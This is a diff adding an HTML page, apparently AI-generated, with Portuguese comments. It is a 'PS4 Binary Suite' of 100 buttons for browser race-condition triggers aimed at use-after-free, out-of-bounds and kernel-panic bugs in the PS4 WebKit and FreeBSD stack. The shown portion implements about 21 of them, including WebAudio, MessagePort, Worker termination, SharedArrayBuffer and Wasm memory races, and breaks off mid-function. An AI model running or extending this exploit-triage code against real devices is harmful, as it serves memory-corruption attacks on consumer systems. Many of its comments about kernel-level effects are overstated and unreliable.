@@ -1,0 +1,3037 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PS4 Binary Suite - Triage V2</title>
+</head>
+<body>
+
+    <h2>Testes de Triagem (Gemini)</h2>
+
+    <button onclick="runAudioContextUAF()">1. WebAudio UAF (Context Destruction Race)</button>
+    <button onclick="runPortEntanglement()">2. MessagePort IPC Entanglement</button>
+    <button onclick="runWebGLSABRace()">3. WebGL + SharedArrayBuffer Data Race</button>
+    <button onclick="runBlobMmapRace()">4. Blob VFS mmap Revocation Race</button>
+    <button onclick="runWorkerIPCTerminate()">5. Worker IPC Transfer Termination Race</button>
+    <button onclick="runWebRTCRace()">6. WebRTC SDP Generation Race (Network UAF)</button>
+    <button onclick="runWasmMmapGrow()">7. WebAssembly mmap Growth Race</button>
+    <button onclick="runIndexedDBAbort()">8. IndexedDB VFS Transaction Abort</button>
+    <button onclick="runGamepadPollingRace()">9. Gamepad HID Polling GC Race</button>
+    <button onclick="runCacheStorageIO()">10. Cache API File Descriptor Interruption</button>
+    <button onclick="runWebSocketDetachRace()">11. WebSocket + Buffer Detach Race</button>
+    <button onclick="runMSERace()">12. MediaSource Extensions (MSE) Abort Race</button>
+    <button onclick="runBroadcastChannelIPC()">13. BroadcastChannel IPC Routing Race</button>
+    <button onclick="runWebCryptoRace()">14. WebCrypto Background Thread Race</button>
+    <button onclick="runImageBitmapGPU()">15. ImageBitmap GPU Backing Store UAF</button>
+    <button onclick="runAtomicsWaitRace()">16. Atomics pthread_cond_wait Race</button>
+    <button onclick="runNestedWorkerTeardown()">17. Nested Worker TCB Teardown</button>
+    <button onclick="runMessagePortTransferDeath()">18. MessagePort IPC Transfer Death</button>
+    <button onclick="runWasmCompilationThreadRace()">19. Wasm Background Compilation Race</button>
+    <button onclick="runStructuredCloneTeardown()">20. Structured Clone Thread Panic</button>
+    <button onclick="runVFSStreamTeardown()">21. VFS Sync Read Teardown (Worker)</button>
+    <button onclick="runAtomicsNotifySignal()">22. Atomics Wake/Terminate Signal Race</button>
+    <button onclick="runReadableStreamIPCDeath()">23. ReadableStream IPC Routing Death</button>
+    <button onclick="runWasmTableDispatchRace()">24. Wasm Table C++ Dispatch Race</button>
+    <button onclick="runSharedMemoryPortStress()">25. SAB + MessagePort GC Teardown</button>
+    <button onclick="runSocketpairIPCRace()">26. FreeBSD Socketpair Allocation Race</button>
+    <button onclick="runMunmapPageFault()">27. SAB munmap() Physical Page Teardown</button>
+    <button onclick="runRTThreadTeardown()">28. AudioWorklet Real-Time Thread Teardown</button>
+    <button onclick="runPOSIXMutexOrphan()">29. Web Locks POSIX Mutex Orphan Race</button>
+    <button onclick="runSCTPNetworkTeardown()">30. WebRTC SCTP Socket Kernel Teardown</button>
+    <button onclick="runOPFSFileLockTeardown()">31. OPFS SyncAccessHandle POSIX Lock Teardown</button>
+    <button onclick="runWebGLContextLossRace()">32. WebGL GPU Context Loss SAB Race</button>
+    <button onclick="runWebMIDISysExDriverRace()">33. Web MIDI SysEx Driver IPC Teardown</button>
+    <button onclick="runSCTPFragmentationPanic()">34. WebRTC SCTP Kernel Fragmentation Panic</button>
+    <button onclick="runSharedWorkerDaemonDeath()">35. SharedWorker Daemon Routing Death</button>
+    <button onclick="runWasmSharedMemoryGrowRace()">36. Wasm Shared Memory VMM Grow Teardown</button>
+    <button onclick="runRTCICECandidateTeardown()">37. WebRTC ICE Gathering Socket Death</button>
+    <button onclick="runMessagePortSerializationDeath()">38. MessagePort Deep Serialization Death</button>
+    <button onclick="runOffscreenCanvasGpuTeardown()">39. OffscreenCanvas GPU Compositor Teardown</button>
+    <button onclick="runWebLocksWorkerTeardown()">40. Web Locks POSIX Mutex Worker Teardown</button>
+    <button onclick="runVFSMediaDriverRace()">41. VFS vnode Media Driver fdrop Race</button>
+    <button onclick="runAudioWorkletIPCTeardown()">42. Real-Time kthread IPC Teardown</button>
+    <button onclick="runKqueuePipeOverflowDeath()">43. kqueue IPC Pipe Buffer Overflow Death</button>
+    <button onclick="runWasmStreamingVFSRace()">44. Wasm JIT Streaming VFS Teardown</button>
+    <button onclick="runSCTPAssociationCloseRace()">45. FreeBSD native SCTP Association Close Race</button>
+    <button onclick="runSCTPDataChannelGCRace()">46. SCTP Socket Garbage Collection Race</button>
+    <button onclick="runOfflineAudioRenderTeardown()">47. OfflineAudioContext pthread Teardown</button>
+    <button onclick="runOPFSBlobRevocationRace()">48. OPFS Sync VFS Blob Revocation</button>
+    <button onclick="runWebGL2TransformFeedbackRace()">49. WebGL2 TransformFeedback VRAM UAF</button>
+    <button onclick="runMessagePortSharedMemoryTeardown()">50. IPC Shared Memory munmap Teardown</button>
+    <button onclick="runWebTransportQUICRace()">51. WebTransport QUIC/UDP Socket Race</button>
+    <button onclick="runGamepadHapticDriverRace()">52. HID Gamepad Haptic Driver Teardown</button>
+    <button onclick="runWasmMemoryGrowWaitRace()">53. Wasm VMM Grow + Atomics.wait Panic</button>
+    <button onclick="runFileSystemWritableStreamAbort()">54. OPFS WritableStream VFS Flush Race</button>
+    <button onclick="runPerformanceObserverTeardown()">55. PerformanceObserver C++ Tracing Death</button>
+    <button onclick="runWebRTCDTLSTeardown()">56. WebRTC DTLS Transport Crypto Teardown</button>
+    <button onclick="runWasmIPCMemoryTransferRace()">57. Wasm Memory Grow + IPC Transfer Race</button>
+    <button onclick="runImageBitmapIPCGCRace()">58. ImageBitmap VRAM IPC Routing UAF</button>
+    <button onclick="runAudioWorkletAtomicsPanic()">59. AudioWorklet kthread Atomics Collision</button>
+    <button onclick="runBroadcastBlobVFSTeardown()">60. BroadcastChannel Blob VFS Revocation</button>
+    <button onclick="runOPFSTruncateRace()">61. OPFS vnode Truncate/Close Race</button>
+    <button onclick="runOffscreenVRAMStealRace()">62. OffscreenCanvas VRAM Steal Teardown</button>
+    <button onclick="runFinalizationRegistryIPCRace()">63. FinalizationRegistry IPC Socketpair Death</button>
+    <button onclick="runWebAudioSIMDTeardown()">64. WebAudio Convolver SIMD DSP Teardown</button>
+    <button onclick="runMediaStreamTrackHardwareRace()">65. MediaStreamTrack Hardware Signal Race</button>
+    <button onclick="runIDBSQLiteTransactionDeath()">66. IndexedDB SQLite VFS Transaction Death</button>
+    <button onclick="runWebGLPBOTeardown()">67. WebGL Pixel Buffer Object (PBO) VRAM Race</button>
+    <button onclick="runWebRTCTCPNetworkRace()">68. WebRTC TCP Socket Handshake Teardown</button>
+    <button onclick="runAudioAnalyserFFTTeardown()">69. WebAudio AnalyserNode FFT DSP Teardown</button>
+    <button onclick="runFetchStreamPipeAbort()">70. Fetch ReadableStream PipeTo VFS Abort</button>
+    <button onclick="runWebGL1VAODrawRace()">71. WebGL 1.0 VAO DMA Draw Race</button>
+    <button onclick="runBlobIPCVnodeRoutingDeath()">72. Blob IPC Vnode Routing Death</button>
+    <button onclick="runLegacyScriptProcessorTeardown()">73. Legacy ScriptProcessor kthread Teardown</button>
+    <button onclick="runFileReaderBufferDetachRace()">74. FileReader VFS Buffer Detach Race</button>
+    <button onclick="runXHRSocketVFSAbort()">75. XHR Network Socket VFS Abort Race</button>
+    <button onclick="runWebRTCBlobSCTPTeardown()">76. WebRTC SCTP Massive Blob vnode Teardown</button>
+    <button onclick="runMediaRecorderEncoderRace()">77. MediaRecorder Hardware Encoder Race</button>
+    <button onclick="runAudioResamplerSIMDTeardown()">78. WebAudio Resampler SIMD Teardown</button>
+    <button onclick="runIDBCursorVFSAbort()">79. SQLite VFS Cursor Iteration Abort</button>
+    <button onclick="runImageBitmapIPCPingPongDeath()">80. ImageBitmap VRAM IPC Ping-Pong Death</button>
+    <button onclick="runWebRTCSCTPStreamReset()">81. WebRTC SCTP Stream Reset Kernel Race</button>
+    <button onclick="runWebGL1RenderbufferVRAMDeath()">82. WebGL 1.0 Renderbuffer VRAM Teardown</button>
+    <button onclick="runBlobSliceVnodePressure()">83. Blob Slice Vnode Reference Teardown</button>
+    <button onclick="runWebCryptoIPCBufferRace()">84. WebCrypto Background Hash IPC Transfer Race</button>
+    <button onclick="runWebAudioBiquadDSPTeardown()">85. WebAudio BiquadFilter DSP Teardown</button>
+    <button onclick="runWebSocketMassiveBufferTeardown()">86. WebSocket TCP Buffer Drop Race</button>
+    <button onclick="runIDBTransactionRollbackRace()">87. SQLite VFS Transaction Rollback Death</button>
+    <button onclick="runWebGL1MipmapGenerationDeath()">88. WebGL 1.0 Mipmap CPU Generation Race</button>
+    <button onclick="runMediaElementAudioSourceTeardown()">89. MediaElement Audio Hardware Demuxer Race</button>
+    <button onclick="runWebRTCTrackStopTeardown()">90. WebRTC MediaStreamTrack Native Stop Race</button>
+    <button onclick="runWSSTLSHandshakeTeardown()">91. WSS TLS/SSL Handshake Kernel Teardown</button>
+    <button onclick="runOPFSDirectoryIteratorRace()">92. OPFS VFS opendir/readdir Iterator Race</button>
+    <button onclick="runWebRTCmDNSResolverDeath()">93. WebRTC mDNS Network Resolver Death</button>
+    <button onclick="runIframeHIDInterruptTeardown()">94. Iframe Gamepad HID Interrupt Teardown</button>
+    <button onclick="runAudioWorkletRingBufferOverflow()">95. AudioWorklet Internal RingBuffer Death</button>
+    <button onclick="runAudioDecodePthreadTeardown()">96. AudioContext decodeAudioData pthread Teardown</button>
+    <button onclick="runImportScriptsSyncVFSRace()">97. Worker importScripts() Sync VFS Race</button>
+    <button onclick="runXHRFormDataSocketAbort()">98. XHR FormData Multipart Socket Abort</button>
+    <button onclick="runFontFaceOSParserTeardown()">99. FontFace OS Parser mmap Teardown</button>
+    <button onclick="runWebRTCOsNetworkPollingDeath()">100. WebRTC getStats() OS Interface Polling Death</button>
+
+    <pre id="log"></pre>
+
+    <script>
+     function log(msg){
+     document.getElementById("log").textContent += msg + "\n";
+    }
+
+        // --- 1. WebAudio UAF ---
+        // Alvo: Destruir o objeto C++ AudioContext na Main Thread enquanto
+        // a Audio Thread no kernel ainda processa o nó oscilador.
+        function runAudioContextUAF() {
+            log("[WebAudio] Iniciando UAF Race...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let osc = ctx.createOscillator();
+                osc.start(0);
+                
+                // Fecha o contexto assincronamente e remove as referências para forçar GC
+                ctx.close().then(() => log("[WebAudio] Contexto fechado."));
+                ctx = null;
+                osc = null;
+                
+                log("[WebAudio] Race disparada. Se o kernel tentar ler o nó, pode causar UAF.");
+            } catch(e) {
+                log("[WebAudio] Erro: " + e.message);
+            }
+        }
+
+        // --- 2. MessagePort IPC Entanglement ---
+        // Alvo: Confundir o gerenciador de File Descriptors (FDs) do sistema 
+        // enviando portas IPC através de si mesmas e fechando-as em trânsito.
+        function runPortEntanglement() {
+            log("[IPC] Iniciando MessagePort Entanglement...");
+            let ch1 = new MessageChannel();
+            let ch2 = new MessageChannel();
+            
+            // Tenta enviar a porta 1 do ch2 através do ch1
+            try {
+                ch1.port1.postMessage("trigger", [ch2.port1]);
+                // Fecha as portas mid-flight (enquanto o C++ tenta mapear os FDs)
+                ch1.port1.close();
+                ch2.port2.close();
+                log("[IPC] Portas fechadas durante o trânsito IPC. Alvo: UAF de File Descriptor.");
+            } catch(e) {
+                log("[IPC] Erro (Pode ter sido bloqueado nativamente): " + e.message);
+            }
+        }
+
+        // --- 3. WebGL + SharedArrayBuffer Data Race ---
+        // Alvo: Out-of-Bounds Read/Write na placa de vídeo. Um Worker altera o SAB
+        // exatamenten no momento em que a Main Thread envia o buffer para o driver da GPU.
+        function runWebGLSABRace() {
+            log("[WebGL] Iniciando Data Race na GPU...");
+            try {
+                let sab = new SharedArrayBuffer(1024 * 1024); // 1MB
+                let view = new Uint8Array(sab);
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl');
+                if(!gl) throw new Error("WebGL não suportado");
+
+                let tex = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, tex);
+
+                // Worker para alterar o SAB assincronamente (loop FINITO para evitar DoS)
+                let workerCode = `
+                    onmessage = function(e) {
+                        let view = new Uint8Array(e.data);
+                        for(let i=0; i<50000; i++) view[0] = i % 255; 
+                        postMessage("done");
+                    };
+                `;
+                let blob = new Blob([workerCode], {type: 'application/javascript'});
+                let w = new Worker(URL.createObjectURL(blob));
+
+                w.onmessage = () => log("[WebGL] Worker terminou a mutação com sucesso.");
+                w.postMessage(sab);
+
+                // Main thread tenta ler o SAB como textura simultaneamente
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 512, 512, 0, gl.RGBA, gl.UNSIGNED_BYTE, view);
+                log("[WebGL] Leitura concluída. Race enviada para a GPU.");
+            } catch(e) {
+                log("[WebGL] Erro ou SAB desabilitado: " + e.message);
+            }
+        }
+
+        // --- 4. Blob VFS mmap Revocation Race ---
+        // Alvo: O subsistema VFS (Virtual File System). Tenta ler um Blob grande 
+        // e instantaneamente revogar a memória mapeada no kernel.
+        function runBlobMmapRace() {
+            log("[VFS] Iniciando Blob mmap Revocation Race...");
+            let data = new Uint8Array(1024 * 1024 * 20).fill(0x41); // 20MB
+            let blob = new Blob([data]);
+            let url = URL.createObjectURL(blob);
+
+            let reader = new FileReader();
+            reader.onload = () => log("[VFS] Leitura concluída (Race falhou em crashar).");
+            
+            // Inicia a leitura
+            reader.readAsArrayBuffer(blob);
+
+            // Aborta e revoga quase instantaneamente
+            URL.revokeObjectURL(url);
+            reader.abort();
+            blob = null;
+            
+            log("[VFS] Leitura abortada. Estrutura C++ de leitura pode ficar órfã.");
+        }
+
+        // --- 5. Worker IPC Transfer Termination Race ---
+        // Alvo: Corrupção do SharedWorkerThreadProxy C++. Envia um buffer gigante
+        // e mata a thread no meio da serialização/transferência de memória.
+        function runWorkerIPCTerminate() {
+            log("[Worker] Iniciando Transfer Termination Race...");
+            let workerCode = `onmessage = function(e) { /* void */ };`;
+            let blob = new Blob([workerCode], {type: 'application/javascript'});
+            let w = new Worker(URL.createObjectURL(blob));
+
+            // Buffer pesado para atrasar propositalmente a engine de IPC
+            let buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+
+            // Transfere a propriedade e "mata" a thread na mesma call stack
+            w.postMessage(buffer, [buffer]);
+            w.terminate();
+
+            log("[Worker] Mensagem em trânsito e Worker terminado abruptamente.");
+        }
+// --- 6. WebRTC SDP Generation Race ---
+        // Alvo: RTCPeerConnection interage fortemente com o kernel para alocar
+        // sockets (UDP/TCP). Destruir o objeto enquanto ele gera a oferta assincronamente.
+        function runWebRTCRace() {
+            log("[WebRTC] Iniciando SDP Race...");
+            try {
+                let pc = new RTCPeerConnection();
+                pc.createDataChannel("exploit");
+                
+                // Pede para o backend C++ compilar a oferta (SDP)
+                let promise = pc.createOffer();
+                
+                // Imediatamente fecha e remove a referência
+                pc.close();
+                pc = null;
+                
+                promise.then(() => {
+                    log("[WebRTC] Oferta criada após fechamento (Pode ter ocorrido UAF no C++).");
+                }).catch(e => {
+                    log("[WebRTC] Promessa rejeitada corretamente: " + e.message);
+                });
+            } catch(e) {
+                log("[WebRTC] Erro: " + e.message);
+            }
+        }
+
+        // --- 7. WebAssembly mmap Growth Race ---
+        // Alvo: O WebKit usa mmap() do FreeBSD para alocar memória Wasm.
+        // Crescer a memória (grow) remapeia as páginas. Se fizermos isso enquanto escrevemos,
+        // podemos causar um Page Fault fatal no kernel ou acessar memória liberada.
+        function runWasmMmapGrow() {
+            log("[WASM] Iniciando mmap Growth Race...");
+            try {
+                // Aloca 1 página inicial (64KB) com limite de 10
+                let memory = new WebAssembly.Memory({initial: 1, maximum: 10});
+                let view = new Uint32Array(memory.buffer);
+                
+                // Dispara escrita no limite
+                view[16383] = 0x41414141; 
+                
+                // Força o remapeamento (mmap remap interno)
+                memory.grow(5); 
+                
+                // Tenta escrever imediatamente após pedir o crescimento, 
+                // competindo com o VMM (Virtual Memory Manager) do kernel.
+                view[16383] = 0x42424242;
+                
+                log("[WASM] Crescimento forçado. Checando se houve corrupção OOB...");
+            } catch(e) {
+                log("[WASM] Erro: " + e.message);
+            }
+        }
+
+        // --- 8. IndexedDB VFS Transaction Abort ---
+        // Alvo: IndexedDB usa SQLite por baixo, que usa File Descriptors reais.
+        // Iniciar a gravação de um Blob massivo e abortar abruptamente destrói o estado do VFS.
+        function runIndexedDBAbort() {
+            log("[IDB] Iniciando VFS Transaction Abort...");
+            let req = indexedDB.open("RaceDB", 1);
+            
+            req.onupgradeneeded = function(e) {
+                let db = e.target.result;
+                if(!db.objectStoreNames.contains("store")) {
+                    db.createObjectStore("store");
+                }
+            };
+            
+            req.onsuccess = function(e) {
+                let db = e.target.result;
+                let tx = db.transaction("store", "readwrite");
+                let store = tx.objectStore("store");
+                
+                // Blob gigante
+                let payload = new Blob([new Uint8Array(1024 * 1024 * 15)]); 
+                store.put(payload, "key1");
+                
+                // Aborta a transação do SQLite imediatamente
+                tx.abort();
+                db.close();
+                log("[IDB] Gravação VFS abortada em pleno voo.");
+            };
+        }
+
+        // --- 9. Gamepad HID Polling GC Race ---
+        // Alvo: navigator.getGamepads() consulta diretamente os drivers HID (Human Interface Device).
+        // A triagem busca dessincronizar a lista de arrays em C++ da representação em JS.
+        function runGamepadPollingRace() {
+            log("[HID] Iniciando Gamepad Polling Race...");
+            if(!navigator.getGamepads) {
+                log("[HID] API não suportada.");
+                return;
+            }
+            
+            try {
+                let pads = navigator.getGamepads();
+                // Tenta ler e forçar a coleta da referência original simultaneamente
+                setTimeout(() => {
+                    pads = null;
+                    let pads2 = navigator.getGamepads();
+                    log("[HID] Polling duplo concluído.");
+                }, 0);
+                
+                log("[HID] Consultando driver de hardware...");
+            } catch(e) {
+                log("[HID] Erro: " + e.message);
+            }
+        }
+
+        // --- 10. Cache API File Descriptor Interruption ---
+        // Alvo: O CacheStorage escreve diretamente no disco (kernel FDs). 
+        // Abortar o signal de um Fetch e deletar o cache simultaneamente gera Use-After-Free no I/O.
+        function runCacheStorageIO() {
+            log("[Cache] Iniciando I/O Interruption Race...");
+            if(!window.caches) {
+                log("[Cache] API de Cache não suportada.");
+                return;
+            }
+
+            let abortController = new AbortController();
+            let payload = new Response(new Blob([new Uint8Array(1024 * 1024 * 10)])); // 10MB
+            
+            caches.open('poc-cache').then(cache => {
+                // Inicia o processo pesado de gravação
+                let putPromise = cache.put(new Request('http://fake.com/poc', {signal: abortController.signal}), payload);
+                
+                // Imediatamente tenta apagar o cache e abortar o I/O subjacente
+                caches.delete('poc-cache');
+                abortController.abort();
+                
+                putPromise.then(() => {
+                    log("[Cache] Gravação completou de forma anômala (Deveria ter abortado).");
+                }).catch(e => {
+                    log("[Cache] Gravação abortada. FDs subjacentes foram testados.");
+                });
+            });
+        }
+// --- 11. WebSocket + Buffer Detach Race ---
+        // Alvo: O subsistema de rede do kernel. Tentamos enviar um ArrayBuffer
+        // pelo socket e, no exato mesmo frame, transferir a propriedade (detach)
+        // do buffer para um Worker. Se o kernel tentar ler o buffer após o detach, causa UAF.
+        function runWebSocketDetachRace() {
+            log("[Network] Iniciando Socket Detach Race...");
+            try {
+                let ws = new WebSocket("ws://127.0.0.1:9999"); // Não precisa conectar para falhar internamente
+                let buffer = new ArrayBuffer(1024 * 1024 * 5); // 5MB
+                
+                let w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(){}"], {type:"text/javascript"})));
+
+                ws.onopen = () => {
+                    // Dispara a escrita na rede
+                    ws.send(buffer);
+                    // Arranca a memória imediatamente via ownership transfer
+                    w.postMessage(buffer, [buffer]);
+                    log("[Network] Buffer enviado para a rede e transferido. Aguardando falha de segmentação...");
+                };
+                
+                // Forçamos a abertura falhar rápido, mas o teste principal ocorre se o socket abrir.
+                // Como não temos um server, simulamos o envio direto se a API permitir buffer interno.
+                ws.send(buffer); 
+                w.postMessage(buffer, [buffer]);
+                log("[Network] Race disparada no buffer interno do WebSocket.");
+
+            } catch(e) {
+                log("[Network] Tratado com segurança: " + e.message);
+            }
+        }
+
+        // --- 12. MediaSource Extensions (MSE) Abort Race ---
+        // Alvo: Drivers de decodificação de vídeo do hardware.
+        // Injetar um buffer de mídia e mandar abortar/remover instantaneamente.
+        function runMSERace() {
+            log("[Media] Iniciando MSE Hardware Race...");
+            if (!window.MediaSource) return log("[Media] MSE não suportado.");
+
+            let ms = new MediaSource();
+            let video = document.createElement('video');
+            video.src = URL.createObjectURL(ms);
+
+            ms.addEventListener('sourceopen', function() {
+                try {
+                    let sourceBuffer = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+                    let fakeData = new Uint8Array(1024 * 500); // 500KB de lixo
+                    
+                    // Manda o decodificador trabalhar
+                    sourceBuffer.appendBuffer(fakeData);
+                    
+                    // Interrompe o driver de hardware abruptamente
+                    sourceBuffer.abort();
+                    ms.removeSourceBuffer(sourceBuffer);
+                    
+                    log("[Media] Abort enviado ao decodificador. Alvo: UAF no Media Pipeline.");
+                } catch(e) {
+                    log("[Media] Erro no MSE: " + e.message);
+                }
+            });
+        }
+
+        // --- 13. BroadcastChannel IPC Routing Race ---
+        // Alvo: A tabela de roteamento de IPC (Inter-Process Communication) do kernel.
+        // Criar, enviar e fechar mensagens em broadcast massivo.
+        function runBroadcastChannelIPC() {
+            log("[IPC] Iniciando BroadcastChannel Race...");
+            if (!window.BroadcastChannel) return log("[IPC] API não suportada.");
+
+            let bc = new BroadcastChannel('exploit_channel');
+            let payload = new Uint8Array(1024 * 1024 * 2); // 2MB
+
+            // Envia a mensagem pro kernel rotear
+            bc.postMessage(payload);
+            
+            // Fecha a porta de comunicação antes que o kernel termine de despachar
+            bc.close();
+            
+            log("[IPC] Mensagem em broadcast enviada e canal fechado simultaneamente.");
+        }
+
+        // --- 14. WebCrypto Background Thread Race ---
+        // Alvo: O WebKit usa threads nativas de SO (pthreads) para criptografia pesada.
+        // Pedimos uma geração de chave RSA e destruímos o contexto que aguarda a resposta.
+        function runWebCryptoRace() {
+            log("[Crypto] Iniciando Background Thread Race...");
+            if (!window.crypto || !window.crypto.subtle) return log("[Crypto] API não suportada.");
+
+            // Pede ao backend nativo para gerar uma chave RSA-OAEP pesada (leva tempo)
+            let promise = crypto.subtle.generateKey(
+                {
+                    name: "RSA-OAEP",
+                    modulusLength: 4096,
+                    publicExponent: new Uint8Array([1, 0, 1]),
+                    hash: "SHA-256"
+                },
+                true,
+                ["encrypt", "decrypt"]
+            );
+
+            // Substitui a promessa e tenta forçar o Garbage Collector a limpar os callbacks
+            // Se a thread C++ tentar chamar o callback de JS destruído = Kernel Panic
+            promise = null;
+            
+            log("[Crypto] Geração de chave delegada à thread. Contexto de retorno invalidado.");
+        }
+
+        // --- 15. ImageBitmap GPU Backing Store UAF ---
+        // Alvo: Memória da GPU gerenciada pelo WebKit. Transferir um bitmap para um Worker
+        // e chamar close() concorrentemente.
+        function runImageBitmapGPU() {
+            log("[GPU] Iniciando ImageBitmap Transfer Race...");
+            
+            let canvas = document.createElement('canvas');
+            canvas.width = 1024; canvas.height = 1024;
+            let ctx = canvas.getContext('2d');
+            ctx.fillStyle = "red";
+            ctx.fillRect(0, 0, 1024, 1024);
+
+            createImageBitmap(canvas).then(bitmap => {
+                let w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(){}"], {type:"text/javascript"})));
+                
+                // Race: Transfere o ownership para o Worker e fecha a textura na Main Thread
+                w.postMessage({bmp: bitmap}, [bitmap]);
+                
+                try {
+                    bitmap.close(); // Tenta invalidar a memória gráfica enquanto o IPC transfere
+                } catch(e) {}
+                
+                log("[GPU] Textura transferida e fechada concorrentemente.");
+            });
+        }
+// --- 16. Atomics pthread_cond_wait Race ---
+        // Alvo: O kernel usa pthread_cond_wait para travar threads em Atomics.wait.
+        // Matar o Worker exatamente quando a syscall do kernel está dormindo/acordando
+        // pode corromper a estrutura de sinais (Signal Stack).
+        function runAtomicsWaitRace() {
+            log("[Pthread] Iniciando Atomics Wait Race...");
+            try {
+                let sab = new SharedArrayBuffer(1024);
+                let view = new Int32Array(sab);
+                
+                let workerCode = `
+                    onmessage = function(e) {
+                        let view = new Int32Array(e.data);
+                        // A thread entra em sleep no kernel (pthread_cond_wait)
+                        Atomics.wait(view, 0, 0, 5000); 
+                    };
+                `;
+                let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+                
+                w.postMessage(sab);
+                
+                // Dispara a terminação quase imediatamente após a thread dormir
+                setTimeout(() => {
+                    w.terminate();
+                    log("[Pthread] Worker terminado enquanto dormia no kernel.");
+                }, 5);
+            } catch(e) {
+                log("[Pthread] Erro: " + e.message);
+            }
+        }
+
+        // --- 17. Nested Worker TCB Teardown ---
+        // Alvo: Gerenciamento do Thread Control Block (TCB).
+        // Criar um Worker que cria outro Worker, e matar o pai enquanto o filho 
+        // está sendo instanciado pelo C++. Orfana estruturas no kernel.
+        function runNestedWorkerTeardown() {
+            log("[TCB] Iniciando Nested Worker Teardown...");
+            
+            let childCode = `onmessage = () => {};`;
+            let childBlob = URL.createObjectURL(new Blob([childCode], {type:"text/javascript"}));
+            
+            let parentCode = `
+                onmessage = function(e) {
+                    let child = new Worker(e.data); // Dispara criação de thread no kernel
+                    // Não fazemos mais nada, o processo de criação está em andamento no C++
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([parentCode], {type:"text/javascript"})));
+            
+            w.postMessage(childBlob);
+            
+            // Race: Matar a thread pai enquanto a thread C++ interna aloca o TCB do filho
+            setTimeout(() => {
+                w.terminate();
+                log("[TCB] Pai exterminado durante a alocação do filho.");
+            }, 2);
+        }
+
+        // --- 18. MessagePort IPC Transfer Death ---
+        // Alvo: O proxy C++ de comunicação inter-threads.
+        // Transferir a posse de uma porta IPC para uma thread e matá-la no mesmo tick.
+        function runMessagePortTransferDeath() {
+            log("[IPC/Thread] Iniciando MessagePort Transfer Death...");
+            
+            let channel = new MessageChannel();
+            let w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(){}"], {type:"text/javascript"})));
+            
+            // Inicia a transferência do File Descriptor associado à porta
+            w.postMessage("transfer", [channel.port2]);
+            
+            // Termina a thread alvo antes que o proxy C++ consiga anexar a porta do outro lado
+            w.terminate();
+            
+            // Tenta usar a porta que ficou num "limbo" de roteamento
+            try {
+                channel.port1.postMessage("ping");
+                channel.port1.close();
+            } catch(e) {}
+            
+            log("[IPC/Thread] Porta transferida e thread destruída simultaneamente.");
+        }
+
+        // --- 19. Wasm Background Compilation Race ---
+        // Alvo: Threads nativas de compilação JIT gerenciadas pelo WebKit.
+        // Passar um buffer Wasm e matar a thread de JS que aguarda o resultado.
+        function runWasmCompilationThreadRace() {
+            log("[JIT/Thread] Iniciando Wasm Compilation Race...");
+            try {
+                // Header básico de um módulo Wasm vazio
+                let wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]); 
+                
+                let workerCode = `
+                    onmessage = function(e) {
+                        // Delega para as background threads de compilação C++
+                        WebAssembly.compile(e.data); 
+                    };
+                `;
+                let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+                
+                w.postMessage(wasmCode);
+                
+                // Destrói o worker imediatamente. A thread background do JIT tentará
+                // retornar o módulo compilado para um Worker Global Scope já desalocado.
+                w.terminate();
+                log("[JIT/Thread] Compilação enviada para background e Worker destruído.");
+            } catch(e) {
+                log("[JIT/Thread] Erro: " + e.message);
+            }
+        }
+
+        // --- 20. Structured Clone Thread Panic ---
+        // Alvo: O algoritmo de clonagem estruturada em C++.
+        // Enviar um objeto massivo e complexo e abortar a thread receptora no meio
+        // da desserialização (alocação de memória na nova thread).
+        function runStructuredCloneTeardown() {
+            log("[C++ Core] Iniciando Structured Clone Panic...");
+            
+            let workerCode = `onmessage = function(e) { /* desserialização pesada ocorre antes daqui */ };`;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Cria um payload aninhado profundo para atrasar o parser C++
+            let payload = [];
+            for(let i = 0; i < 10000; i++) {
+                payload.push({a: new ArrayBuffer(1024), b: i});
+            }
+            
+            w.postMessage(payload);
+            
+            // Interrompe a thread exatamente enquanto ela varre a árvore do objeto em C++
+            setTimeout(() => {
+                w.terminate();
+                log("[C++ Core] Desserialização interrompida via SIGKILL interno.");
+            }, 3);
+        }
+// --- 21. VFS Sync Read Teardown (Worker) ---
+        // Alvo: O subsistema VFS do kernel. Diferente do FileReader assíncrono,
+        // o FileReaderSync trava a thread nativa do Worker numa syscall de I/O.
+        // Matar a thread exatemente durante o bloqueio da leitura síncrona.
+        function runVFSStreamTeardown() {
+            log("[VFS/Thread] Iniciando Sync Read Teardown...");
+            
+            // Blob gigante para garantir que a syscall de I/O leve alguns milissegundos
+            let blob = new Blob([new Uint8Array(1024 * 1024 * 50)]); 
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    let reader = new FileReaderSync();
+                    // Trava a thread no kernel lendo o arquivo mapeado
+                    reader.readAsArrayBuffer(e.data); 
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            w.postMessage(blob);
+            
+            // Dispara o sinal SIGKILL interno enquanto a thread do kernel está bloqueada no I/O
+            setTimeout(() => {
+                w.terminate();
+                log("[VFS/Thread] Worker terminado no meio da syscall de leitura síncrona.");
+            }, 5);
+        }
+
+        // --- 22. Atomics Wake/Terminate Signal Race ---
+        // Alvo: O gerenciador de sinais do SO (pthread_cond_signal / broadcast).
+        // Mandar o kernel acordar uma thread e, no exato mesmo frame de execução,
+        // mandar destruir a thread que está sendo acordada.
+        function runAtomicsNotifySignal() {
+            log("[Signal/TCB] Iniciando Wake/Terminate Signal Race...");
+            
+            let sab = new SharedArrayBuffer(1024);
+            let view = new Int32Array(sab);
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    let view = new Int32Array(e.data);
